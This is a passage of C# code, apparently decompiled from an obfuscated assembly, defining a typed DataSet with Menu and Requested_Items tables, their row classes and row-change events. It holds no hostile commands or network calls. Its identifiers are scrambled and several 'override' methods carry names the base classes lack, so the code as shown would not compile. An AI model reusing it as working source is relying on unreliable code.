using System;
using System.CodeDom.Compiler;
using System.Collections;
using System.ComponentModel;
using System.ComponentModel.Design;
using System.Data;
using System.IO;
using System.Net;
using System.Runtime.CompilerServices;
using System.Runtime.Serialization;
using System.Threading;
using System.Xml;
using System.Xml.Schema;
using System.Xml.Serialization;
using Microsoft.VisualBasic.CompilerServices;
using d0E;
using x9X;
using y4S;

namespace w8E;

[Serializable]
[DesignerCategory("code")]
[XmlSchemaProvider("GetTypedDataSetSchema")]
[HelpKeyword("vs.data.DataSet")]
[XmlRoot("ReepahDataSet2")]
[ToolboxItem(true)]
public class Si0 : DataSet
{
	[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "16.0.0.0")]
	public delegate void f4D(object sender, q9F e);

	[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "16.0.0.0")]
	public delegate void g9X(object sender, d7K e);

	[Serializable]
	[XmlSchemaProvider("GetTypedTableSchema")]
	public class Xs5 : TypedTableBase<x6A>
	{
		private DataColumn columnID;

		private DataColumn columnMenu;

		private DataColumn columnCost;

		private f4D MenuRowChangingEvent;

		private f4D MenuRowChangedEvent;

		private f4D MenuRowDeletingEvent;

		private f4D MenuRowDeletedEvent;

		[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "16.0.0.0")]
		public DataColumn IDColumn => columnID;

		[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "16.0.0.0")]
		public DataColumn MenuColumn => columnMenu;

		[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "16.0.0.0")]
		public DataColumn CostColumn => columnCost;

		[Browsable(false)]
		[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "16.0.0.0")]
		public int Count => base.Rows.Count;

		[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "16.0.0.0")]
		public x6A this[int d0X] => (x6A)base.Rows[d0X];

		[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "16.0.0.0")]
		public event f4D MenuRowChanging
		{
			add
			{
				f4D f4D = MenuRowChangingEvent;
				f4D f4D2;
				do
				{
					f4D2 = f4D;
					f4D value2 = (f4D)Delegate.Combine(f4D2, value);
					f4D = Interlocked.CompareExchange(ref MenuRowChangingEvent, value2, f4D2);
				}
				while ((object)f4D != f4D2);
			}
			remove
			{
				f4D f4D = MenuRowChangingEvent;
				f4D f4D2;
				do
				{
					f4D2 = f4D;
					f4D value2 = (f4D)Delegate.Remove(f4D2, value);
					f4D = Interlocked.CompareExchange(ref MenuRowChangingEvent, value2, f4D2);
				}
				while ((object)f4D != f4D2);
			}
		}

		[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "16.0.0.0")]
		public event f4D MenuRowChanged
		{
			add
			{
				f4D f4D = MenuRowChangedEvent;
				f4D f4D2;
				do
				{
					f4D2 = f4D;
					f4D value2 = (f4D)Delegate.Combine(f4D2, value);
					f4D = Interlocked.CompareExchange(ref MenuRowChangedEvent, value2, f4D2);
				}
				while ((object)f4D != f4D2);
			}
			remove
			{
				f4D f4D = MenuRowChangedEvent;
				f4D f4D2;
				do
				{
					f4D2 = f4D;
					f4D value2 = (f4D)Delegate.Remove(f4D2, value);
					f4D = Interlocked.CompareExchange(ref MenuRowChangedEvent, value2, f4D2);
				}
				while ((object)f4D != f4D2);
			}
		}

		[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "16.0.0.0")]
		public event f4D MenuRowDeleting
		{
			add
			{
				f4D f4D = MenuRowDeletingEvent;
				f4D f4D2;
				do
				{
					f4D2 = f4D;
					f4D value2 = (f4D)Delegate.Combine(f4D2, value);
					f4D = Interlocked.CompareExchange(ref MenuRowDeletingEvent, value2, f4D2);
				}
				while ((object)f4D != f4D2);
			}
			remove
			{
				f4D f4D = MenuRowDeletingEvent;
				f4D f4D2;
				do
				{
					f4D2 = f4D;
					f4D value2 = (f4D)Delegate.Remove(f4D2, value);
					f4D = Interlocked.CompareExchange(ref MenuRowDeletingEvent, value2, f4D2);
				}
				while ((object)f4D != f4D2);
			}
		}

		[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "16.0.0.0")]
		public event f4D MenuRowDeleted
		{
			add
			{
				f4D f4D = MenuRowDeletedEvent;
				f4D f4D2;
				do
				{
					f4D2 = f4D;
					f4D value2 = (f4D)Delegate.Combine(f4D2, value);
					f4D = Interlocked.CompareExchange(ref MenuRowDeletedEvent, value2, f4D2);
				}
				while ((object)f4D != f4D2);
			}
			remove
			{
				f4D f4D = MenuRowDeletedEvent;
				f4D f4D2;
				do
				{
					f4D2 = f4D;
					f4D value2 = (f4D)Delegate.Remove(f4D2, value);
					f4D = Interlocked.CompareExchange(ref MenuRowDeletedEvent, value2, f4D2);
				}
				while ((object)f4D != f4D2);
			}
		}

		[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "16.0.0.0")]
		public Xs5()
		{
			base.TableName = "Menu";
			BeginInit();
			q3H();
			EndInit();
		}

		[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "16.0.0.0")]
		internal Xs5(DataTable table)
		{
			base.TableName = table.TableName;
			if (table.CaseSensitive != table.DataSet!.CaseSensitive)
			{
				base.CaseSensitive = table.CaseSensitive;
			}
			if (Operators.CompareString(table.Locale.ToString(), table.DataSet!.Locale.ToString(), false) != 0)
			{
				base.Locale = table.Locale;
			}
			if (Operators.CompareString(table.Namespace, table.DataSet!.Namespace, false) != 0)
			{
				base.Namespace = table.Namespace;
			}
			base.Prefix = table.Prefix;
			base.MinimumCapacity = table.MinimumCapacity;
		}

		[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "16.0.0.0")]
		protected Xs5(SerializationInfo info, StreamingContext context)
			: base(info, context)
		{
			e0P();
		}

		[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "16.0.0.0")]
		public void z0Q(x6A y9C)
		{
			base.Rows.Add(y9C);
		}

		[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "16.0.0.0")]
		public x6A Yp5(string Xt8, decimal i8B)
		{
			x6A x6A = (x6A)NewRow();
			object[] array2 = (x6A.ItemArray = new object[3] { null, Xt8, i8B });
			base.Rows.Add(x6A);
			return x6A;
		}

		[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "16.0.0.0")]
		public x6A y8M(int i1S)
		{
			return (x6A)base.Rows.Find(new object[1] { i1S });
		}

		[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "16.0.0.0")]
		public override DataTable o9L()
		{
			Xs5 xs = (Xs5)base.Clone();
			xs.e0P();
			return xs;
		}

		[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "16.0.0.0")]
		protected override DataTable x4C()
		{
			return new Xs5();
		}

		[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "16.0.0.0")]
		internal void e0P()
		{
			columnID = base.Columns["ID"];
			columnMenu = base.Columns["Menu"];
			columnCost = base.Columns["Cost"];
		}

		[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "16.0.0.0")]
		private void q3H()
		{
			columnID = new DataColumn("ID", typeof(int), null, MappingType.Element);
			base.Columns.Add(columnID);
			columnMenu = new DataColumn("Menu", typeof(string), null, MappingType.Element);
			base.Columns.Add(columnMenu);
			columnCost = new DataColumn("Cost", typeof(decimal), null, MappingType.Element);
			base.Columns.Add(columnCost);
			base.Constraints.Add(new UniqueConstraint("Constraint1", new DataColumn[1] { columnID }, isPrimaryKey: true));
			columnID.AutoIncrement = true;
			columnID.AutoIncrementSeed = -1L;
			columnID.AutoIncrementStep = -1L;
			columnID.AllowDBNull = false;
			columnID.Unique = true;
			columnMenu.MaxLength = 536870910;
		}

		[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "16.0.0.0")]
		public x6A Sc8()
		{
			return (x6A)NewRow();
		}

		[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "16.0.0.0")]
		protected override DataRow g8R(DataRowBuilder Re8)
		{
			return new x6A(Re8);
		}

		[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "16.0.0.0")]
		protected override Type Fk5()
		{
			return typeof(x6A);
		}

		[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "16.0.0.0")]
		protected override void x5M(DataRowChangeEventArgs Sk2)
		{
			base.OnRowChanged(Sk2);
			if (MenuRowChangedEvent != null)
			{
				MenuRowChangedEvent?.Invoke(this, new q9F((x6A)Sk2.Row, Sk2.Action));
			}
		}

		[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "16.0.0.0")]
		protected override void n6X(DataRowChangeEventArgs e8T)
		{
			base.OnRowChanging(e8T);
			if (MenuRowChangingEvent != null)
			{
				MenuRowChangingEvent?.Invoke(this, new q9F((x6A)e8T.Row, e8T.Action));
			}
		}

		[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "16.0.0.0")]
		protected override void Pj4(DataRowChangeEventArgs a8H)
		{
			base.OnRowDeleted(a8H);
			if (MenuRowDeletedEvent != null)
			{
				MenuRowDeletedEvent?.Invoke(this, new q9F((x6A)a8H.Row, a8H.Action));
			}
		}

		[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "16.0.0.0")]
		protected override void p7P(DataRowChangeEventArgs Cp5)
		{
			base.OnRowDeleting(Cp5);
			if (MenuRowDeletingEvent != null)
			{
				MenuRowDeletingEvent?.Invoke(this, new q9F((x6A)Cp5.Row, Cp5.Action));
			}
		}

		[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "16.0.0.0")]
		public void e6Q(x6A k8L)
		{
			base.Rows.Remove(k8L);
		}

		[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "16.0.0.0")]
		public static XmlSchemaComplexType Np3(XmlSchemaSet j5D)
		{
			XmlSchemaComplexType xmlSchemaComplexType = new XmlSchemaComplexType();
			XmlSchemaSequence xmlSchemaSequence = new XmlSchemaSequence();
			Si0 si = new Si0();
			XmlSchemaAny xmlSchemaAny = new XmlSchemaAny();
			xmlSchemaAny.Namespace = "http://www.w3.org/2001/XMLSchema";
			xmlSchemaAny.MinOccurs = 0m;
			xmlSchemaAny.MaxOccurs = decimal.MaxValue;
			xmlSchemaAny.ProcessContents = XmlSchemaContentProcessing.Lax;
			xmlSchemaSequence.Items.Add(xmlSchemaAny);
			XmlSchemaAny xmlSchemaAny2 = new XmlSchemaAny();
			xmlSchemaAny2.Namespace = "urn:schemas-microsoft-com:xml-diffgram-v1";
			xmlSchemaAny2.MinOccurs = 1m;
			xmlSchemaAny2.ProcessContents = XmlSchemaContentProcessing.Lax;
			xmlSchemaSequence.Items.Add(xmlSchemaAny2);
			XmlSchemaAttribute xmlSchemaAttribute = new XmlSchemaAttribute();
			xmlSchemaAttribute.Name = "namespace";
			xmlSchemaAttribute.FixedValue = si.Namespace;
			xmlSchemaComplexType.Attributes.Add(xmlSchemaAttribute);
			XmlSchemaAttribute xmlSchemaAttribute2 = new XmlSchemaAttribute();
			xmlSchemaAttribute2.Name = "tableTypeName";
			xmlSchemaAttribute2.FixedValue = "MenuDataTable";
			xmlSchemaComplexType.Attributes.Add(xmlSchemaAttribute2);
			xmlSchemaComplexType.Particle = xmlSchemaSequence;
			XmlSchema xmlSchema = si.n8T();
			if (j5D.Contains(xmlSchema.TargetNamespace))
			{
				MemoryStream memoryStream = new MemoryStream();
				MemoryStream memoryStream2 = new MemoryStream();
				try
				{
					XmlSchema xmlSchema2 = null;
					xmlSchema.Write(memoryStream);
					IEnumerator enumerator = j5D.Schemas(xmlSchema.TargetNamespace).GetEnumerator();
					while (enumerator.MoveNext())
					{
						xmlSchema2 = (XmlSchema)enumerator.Current;
						memoryStream2.SetLength(0L);
						xmlSchema2.Write(memoryStream2);
						if (memoryStream.Length == memoryStream2.Length)
						{
							memoryStream.Position = 0L;
							memoryStream2.Position = 0L;
							while (memoryStream.Position != memoryStream.Length && memoryStream.ReadByte() == memoryStream2.ReadByte())
							{
							}
							if (memoryStream.Position == memoryStream.Length)
							{
								return xmlSchemaComplexType;
							}
						}
					}
				}
				finally
				{
					memoryStream?.Close();
					memoryStream2?.Close();
				}
			}
			j5D.Add(xmlSchema);
			return xmlSchemaComplexType;
		}
	}

	[Serializable]
	[XmlSchemaProvider("GetTypedTableSchema")]
	public class z1K : TypedTableBase<a6X>
	{
		private DataColumn columnID;

		private DataColumn columnItems;

		private DataColumn columnCost;

		private g9X Requested_ItemsRowChangingEvent;

		private g9X Requested_ItemsRowChangedEvent;

		private g9X Requested_ItemsRowDeletingEvent;

		private g9X Requested_ItemsRowDeletedEvent;

		[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "16.0.0.0")]
		public DataColumn IDColumn => columnID;

		[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "16.0.0.0")]
		public DataColumn ItemsColumn => columnItems;

		[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "16.0.0.0")]
		public DataColumn CostColumn => columnCost;

		[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "16.0.0.0")]
		[Browsable(false)]
		public int Count => base.Rows.Count;

		[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "16.0.0.0")]
		public a6X this[int Wk6] => (a6X)base.Rows[Wk6];

		[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "16.0.0.0")]
		public event g9X Requested_ItemsRowChanging
		{
			add
			{
				g9X g9X = Requested_ItemsRowChangingEvent;
				g9X g9X2;
				do
				{
					g9X2 = g9X;
					g9X value2 = (g9X)Delegate.Combine(g9X2, value);
					g9X = Interlocked.CompareExchange(ref Requested_ItemsRowChangingEvent, value2, g9X2);
				}
				while ((object)g9X != g9X2);
			}
			remove
			{
				g9X g9X = Requested_ItemsRowChangingEvent;
				g9X g9X2;
				do
				{
					g9X2 = g9X;
					g9X value2 = (g9X)Delegate.Remove(g9X2, value);
					g9X = Interlocked.CompareExchange(ref Requested_ItemsRowChangingEvent, value2, g9X2);
				}
				while ((object)g9X != g9X2);
			}
		}

		[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "16.0.0.0")]
		public event g9X Requested_ItemsRowChanged
		{
			add
			{
				g9X g9X = Requested_ItemsRowChangedEvent;
				g9X g9X2;
				do
				{
					g9X2 = g9X;
					g9X value2 = (g9X)Delegate.Combine(g9X2, value);
					g9X = Interlocked.CompareExchange(ref Requested_ItemsRowChangedEvent, value2, g9X2);
				}
				while ((object)g9X != g9X2);
			}
			remove
			{
				g9X g9X = Requested_ItemsRowChangedEvent;
				g9X g9X2;
				do
				{
					g9X2 = g9X;
					g9X value2 = (g9X)Delegate.Remove(g9X2, value);
					g9X = Interlocked.CompareExchange(ref Requested_ItemsRowChangedEvent, value2, g9X2);
				}
				while ((object)g9X != g9X2);
			}
		}

		[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "16.0.0.0")]
		public event g9X Requested_ItemsRowDeleting
		{
			add
			{
				g9X g9X = Requested_ItemsRowDeletingEvent;
				g9X g9X2;
				do
				{
					g9X2 = g9X;
					g9X value2 = (g9X)Delegate.Combine(g9X2, value);
					g9X = Interlocked.CompareExchange(ref Requested_ItemsRowDeletingEvent, value2, g9X2);
				}
				while ((object)g9X != g9X2);
			}
			remove
			{
				g9X g9X = Requested_ItemsRowDeletingEvent;
				g9X g9X2;
				do
				{
					g9X2 = g9X;
					g9X value2 = (g9X)Delegate.Remove(g9X2, value);
					g9X = Interlocked.CompareExchange(ref Requested_ItemsRowDeletingEvent, value2, g9X2);
				}
				while ((object)g9X != g9X2);
			}
		}

		[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "16.0.0.0")]
		public event g9X Requested_ItemsRowDeleted
		{
			add
			{
				g9X g9X = Requested_ItemsRowDeletedEvent;
				g9X g9X2;
				do
				{
					g9X2 = g9X;
					g9X value2 = (g9X)Delegate.Combine(g9X2, value);
					g9X = Interlocked.CompareExchange(ref Requested_ItemsRowDeletedEvent, value2, g9X2);
				}
				while ((object)g9X != g9X2);
			}
			remove
			{
				g9X g9X = Requested_ItemsRowDeletedEvent;
				g9X g9X2;
				do
				{
					g9X2 = g9X;
					g9X value2 = (g9X)Delegate.Remove(g9X2, value);
					g9X = Interlocked.CompareExchange(ref Requested_ItemsRowDeletedEvent, value2, g9X2);
				}
				while ((object)g9X != g9X2);
			}
		}

		[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "16.0.0.0")]
		public z1K()
		{
			base.TableName = "Requested_Items";
			BeginInit();
			Zs7();
			EndInit();
		}

		[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "16.0.0.0")]
		internal z1K(DataTable table)
		{
			base.TableName = table.TableName;
			if (table.CaseSensitive != table.DataSet!.CaseSensitive)
			{
				base.CaseSensitive = table.CaseSensitive;
			}
			if (Operators.CompareString(table.Locale.ToString(), table.DataSet!.Locale.ToString(), false) != 0)
			{
				base.Locale = table.Locale;
			}
			if (Operators.CompareString(table.Namespace, table.DataSet!.Namespace, false) != 0)
			{
				base.Namespace = table.Namespace;
			}
			base.Prefix = table.Prefix;
			base.MinimumCapacity = table.MinimumCapacity;
		}

		[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "16.0.0.0")]
		protected z1K(SerializationInfo info, StreamingContext context)
			: base(info, context)
		{
			Et6();
		}

		[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "16.0.0.0")]
		public void d3S(a6X Bk5)
		{
			base.Rows.Add(Bk5);
		}

		[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "16.0.0.0")]
		public a6X g3F(string Gx0, decimal Gs5)
		{
			a6X a6X = (a6X)NewRow();
			object[] array2 = (a6X.ItemArray = new object[3] { null, Gx0, Gs5 });
			base.Rows.Add(a6X);
			return a6X;
		}

		[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "16.0.0.0")]
		public a6X Jp4(int Xn1)
		{
			return (a6X)base.Rows.Find(new object[1] { Xn1 });
		}

		[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "16.0.0.0")]
		public override DataTable t8M()
		{
			z1K z1K = (z1K)base.Clone();
			z1K.Et6();
			return z1K;
		}

		[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "16.0.0.0")]
		protected override DataTable Nq3()
		{
			return new z1K();
		}

		[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "16.0.0.0")]
		internal void Et6()
		{
			columnID = base.Columns["ID"];
			columnItems = base.Columns["Items"];
			columnCost = base.Columns["Cost"];
		}

		[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "16.0.0.0")]
		private void Zs7()
		{
			columnID = new DataColumn("ID", typeof(int), null, MappingType.Element);
			base.Columns.Add(columnID);
			columnItems = new DataColumn("Items", typeof(string), null, MappingType.Element);
			base.Columns.Add(columnItems);
			columnCost = new DataColumn("Cost", typeof(decimal), null, MappingType.Element);
			base.Columns.Add(columnCost);
			base.Constraints.Add(new UniqueConstraint("Constraint1", new DataColumn[1] { columnID }, isPrimaryKey: true));
			columnID.AutoIncrement = true;
			columnID.AutoIncrementSeed = -1L;
			columnID.AutoIncrementStep = -1L;
			columnID.AllowDBNull = false;
			columnID.Unique = true;
			columnItems.MaxLength = 536870910;
		}

		[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "16.0.0.0")]
		public a6X y9Q()
		{
			return (a6X)NewRow();
		}

		[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "16.0.0.0")]
		protected override DataRow m9J(DataRowBuilder w7J)
		{
			return new a6X(w7J);
		}

		[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "16.0.0.0")]
		protected override Type Cg7()
		{
			return typeof(a6X);
		}

		[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "16.0.0.0")]
		protected override void q9T(DataRowChangeEventArgs i5G)
		{
			base.OnRowChanged(i5G);
			if (Requested_ItemsRowChangedEvent != null)
			{
				Requested_ItemsRowChangedEvent?.Invoke(this, new d7K((a6X)i5G.Row, i5G.Action));
			}
		}

		[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "16.0.0.0")]
		protected override void Hf7(DataRowChangeEventArgs s3P)
		{
			base.OnRowChanging(s3P);
			if (Requested_ItemsRowChangingEvent != null)
			{
				Requested_ItemsRowChangingEvent?.Invoke(this, new d7K((a6X)s3P.Row, s3P.Action));
			}
		}

		[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "16.0.0.0")]
		protected override void Jb7(DataRowChangeEventArgs Sa3)
		{
			base.OnRowDeleted(Sa3);
			if (Requested_ItemsRowDeletedEvent != null)
			{
				Requested_ItemsRowDeletedEvent?.Invoke(this, new d7K((a6X)Sa3.Row, Sa3.Action));
			}
		}

		[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "16.0.0.0")]
		protected override void s2L(DataRowChangeEventArgs r5A)
		{
			base.OnRowDeleting(r5A);
			if (Requested_ItemsRowDeletingEvent != null)
			{
				Requested_ItemsRowDeletingEvent?.Invoke(this, new d7K((a6X)r5A.Row, r5A.Action));
			}
		}

		[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "16.0.0.0")]
		public void Qi8(a6X z8A)
		{
			base.Rows.Remove(z8A);
		}

		[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "16.0.0.0")]
		public static XmlSchemaComplexType Ri1(XmlSchemaSet b9E)
		{
			XmlSchemaComplexType xmlSchemaComplexType = new XmlSchemaComplexType();
			XmlSchemaSequence xmlSchemaSequence = new XmlSchemaSequence();
			Si0 si = new Si0();
			XmlSchemaAny xmlSchemaAny = new XmlSchemaAny();
			xmlSchemaAny.Namespace = "http://www.w3.org/2001/XMLSchema";
			xmlSchemaAny.MinOccurs = 0m;
			xmlSchemaAny.MaxOccurs = decimal.MaxValue;
			xmlSchemaAny.ProcessContents = XmlSchemaContentProcessing.Lax;
			xmlSchemaSequence.Items.Add(xmlSchemaAny);
			XmlSchemaAny xmlSchemaAny2 = new XmlSchemaAny();
			xmlSchemaAny2.Namespace = "urn:schemas-microsoft-com:xml-diffgram-v1";
			xmlSchemaAny2.MinOccurs = 1m;
			xmlSchemaAny2.ProcessContents = XmlSchemaContentProcessing.Lax;
			xmlSchemaSequence.Items.Add(xmlSchemaAny2);
			XmlSchemaAttribute xmlSchemaAttribute = new XmlSchemaAttribute();
			xmlSchemaAttribute.Name = "namespace";
			xmlSchemaAttribute.FixedValue = si.Namespace;
			xmlSchemaComplexType.Attributes.Add(xmlSchemaAttribute);
			XmlSchemaAttribute xmlSchemaAttribute2 = new XmlSchemaAttribute();
			xmlSchemaAttribute2.Name = "tableTypeName";
			xmlSchemaAttribute2.FixedValue = "Requested_ItemsDataTable";
			xmlSchemaComplexType.Attributes.Add(xmlSchemaAttribute2);
			xmlSchemaComplexType.Particle = xmlSchemaSequence;
			XmlSchema xmlSchema = si.n8T();
			if (b9E.Contains(xmlSchema.TargetNamespace))
			{
				MemoryStream memoryStream = new MemoryStream();
				MemoryStream memoryStream2 = new MemoryStream();
				try
				{
					XmlSchema xmlSchema2 = null;
					xmlSchema.Write(memoryStream);
					IEnumerator enumerator = b9E.Schemas(xmlSchema.TargetNamespace).GetEnumerator();
					while (enumerator.MoveNext())
					{
						xmlSchema2 = (XmlSchema)enumerator.Current;
						memoryStream2.SetLength(0L);
						xmlSchema2.Write(memoryStream2);
						if (memoryStream.Length == memoryStream2.Length)
						{
							memoryStream.Position = 0L;
							memoryStream2.Position = 0L;
							while (memoryStream.Position != memoryStream.Length && memoryStream.ReadByte() == memoryStream2.ReadByte())
							{
							}
							if (memoryStream.Position == memoryStream.Length)
							{
								return xmlSchemaComplexType;
							}
						}
					}
				}
				finally
				{
					memoryStream?.Close();
					memoryStream2?.Close();
				}
			}
			b9E.Add(xmlSchema);
			return xmlSchemaComplexType;
		}
	}

	public class x6A : DataRow
	{
		private Xs5 tableMenu;

		[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "16.0.0.0")]
		public int ID
		{
			get
			{
				return Conversions.ToInteger(base[tableMenu.IDColumn]);
			}
			set
			{
				base[tableMenu.IDColumn] = value;
			}
		}

		[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "16.0.0.0")]
		public string Menu
		{
			get
			{
				try
				{
					return Conversions.ToString(base[tableMenu.MenuColumn]);
				}
				catch (InvalidCastException ex)
				{
					ProjectData.SetProjectError((Exception)ex);
					InvalidCastException innerException = ex;
					throw new StrongTypingException("The value for column 'Menu' in table 'Menu' is DBNull.", innerException);
				}
			}
			set
			{
				base[tableMenu.MenuColumn] = value;
			}
		}

		[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "16.0.0.0")]
		public decimal Cost
		{
			get
			{
				try
				{
					return Conversions.ToDecimal(base[tableMenu.CostColumn]);
				}
				catch (InvalidCastException ex)
				{
					ProjectData.SetProjectError((Exception)ex);
					InvalidCastException innerException = ex;
					throw new StrongTypingException("The value for column 'Cost' in table 'Menu' is DBNull.", innerException);
				}
			}
			set
			{
				base[tableMenu.CostColumn] = value;
			}
		}

		[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "16.0.0.0")]
		internal x6A(DataRowBuilder rb)
			: base(rb)
		{
			tableMenu = (Xs5)base.Table;
		}

		[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "16.0.0.0")]
		public bool Po8()
		{
			return IsNull(tableMenu.MenuColumn);
		}

		[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "16.0.0.0")]
		public void Tp8()
		{
			base[tableMenu.MenuColumn] = RuntimeHelpers.GetObjectValue(Convert.DBNull);
		}

		[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "16.0.0.0")]
		public bool Tk7()
		{
			return IsNull(tableMenu.CostColumn);
		}

		[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "16.0.0.0")]
		public void e2W()
		{
			base[tableMenu.CostColumn] = RuntimeHelpers.GetObjectValue(Convert.DBNull);
		}
	}

	public class a6X : DataRow
	{
		private z1K tableRequested_Items;

		[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "16.0.0.0")]
		public int ID
		{
			get
			{
				return Conversions.ToInteger(base[tableRequested_Items.IDColumn]);
			}
			set
			{
				base[tableRequested_Items.IDColumn] = value;
			}
		}

		[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "16.0.0.0")]
		public string Items
		{
			get
			{
				try
				{
					return Conversions.ToString(base[tableRequested_Items.ItemsColumn]);
				}
				catch (InvalidCastException ex)
				{
					ProjectData.SetProjectError((Exception)ex);
					InvalidCastException innerException = ex;
					throw new StrongTypingException("The value for column 'Items' in table 'Requested_Items' is DBNull.", innerException);
				}
			}
			set
			{
				base[tableRequested_Items.ItemsColumn] = value;
			}
		}

		[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "16.0.0.0")]
		public decimal Cost
		{
			get
			{
				try
				{
					return Conversions.ToDecimal(base[tableRequested_Items.CostColumn]);
				}
				catch (InvalidCastException ex)
				{
					ProjectData.SetProjectError((Exception)ex);
					InvalidCastException innerException = ex;
					throw new StrongTypingException("The value for column 'Cost' in table 'Requested_Items' is DBNull.", innerException);
				}
			}
			set
			{
				base[tableRequested_Items.CostColumn] = value;
			}
		}

		[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "16.0.0.0")]
		internal a6X(DataRowBuilder rb)
			: base(rb)
		{
			tableRequested_Items = (z1K)base.Table;
		}

		[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "16.0.0.0")]
		public bool i4S()
		{
			return IsNull(tableRequested_Items.ItemsColumn);
		}

		[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "16.0.0.0")]
		public void q8M()
		{
			base[tableRequested_Items.ItemsColumn] = RuntimeHelpers.GetObjectValue(Convert.DBNull);
		}

		[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "16.0.0.0")]
		public bool Td2()
		{
			return IsNull(tableRequested_Items.CostColumn);
		}

		[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "16.0.0.0")]
		public void d1T()
		{
			base[tableRequested_Items.CostColumn] = RuntimeHelpers.GetObjectValue(Convert.DBNull);
		}
	}

	[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "16.0.0.0")]
	public class q9F : EventArgs
	{
		private x6A eventRow;

		private DataRowAction eventAction;

		[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "16.0.0.0")]
		public x6A Row => eventRow;

		[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "16.0.0.0")]
		public DataRowAction Action => eventAction;

		[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "16.0.0.0")]
		public q9F(x6A row, DataRowAction action)
		{
			eventRow = row;
			eventAction = action;
		}
	}

	[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "16.0.0.0")]
	public class d7K : EventArgs
	{
		private a6X eventRow;

		private DataRowAction eventAction;

		[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "16.0.0.0")]
		public a6X Row => eventRow;

		[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "16.0.0.0")]
		public DataRowAction Action => eventAction;

		[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "16.0.0.0")]
		public d7K(a6X row, DataRowAction action)
		{
			eventRow = row;
			eventAction = action;
		}
	}

	private Xs5 tableMenu;

	private z1K tableRequested_Items;

	private SchemaSerializationMode _schemaSerializationMode;

	[Browsable(false)]
	[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "16.0.0.0")]
	[DesignerSerializationVisibility(DesignerSerializationVisibility.Content)]
	public Xs5 Menu => tableMenu;

	[DesignerSerializationVisibility(DesignerSerializationVisibility.Content)]
	[Browsable(false)]
	[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "16.0.0.0")]
	public z1K Requested_Items => tableRequested_Items;

	[Browsable(true)]
	[DesignerSerializationVisibility(DesignerSerializationVisibility.Visible)]
	[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "16.0.0.0")]
	public override SchemaSerializationMode SchemaSerializationMode
	{
		get
		{
			return _schemaSerializationMode;
		}
		set
		{
			_schemaSerializationMode = value;
		}
